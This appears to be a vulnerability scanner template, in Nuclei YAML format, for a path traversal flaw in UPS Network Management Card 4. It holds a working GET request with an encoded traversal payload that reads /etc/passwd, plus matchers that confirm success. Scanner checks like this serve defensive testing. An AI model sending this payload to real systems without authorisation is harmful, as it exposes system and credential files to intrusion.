id: ups-network-management-card-4-path-traversal
info:
  name: UPS Network Management Card 4 Path Traversal
  author: Víctor García
  severity: high
  description: UPS Network Management Card version 4 suffers from a path traversal vulnerability.
  reference:
    - https://packetstormsecurity.com/files/177626/upsnmc4-traversal.txt
    - https://www.exploit-db.com/exploits/51897

http:
    - method: GET
      path:
        - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      matchers-condition: and
      matchers:
        - type: regex
          regex:
            - "root:.*:0:0:"

        - type: status
          status:
            - 200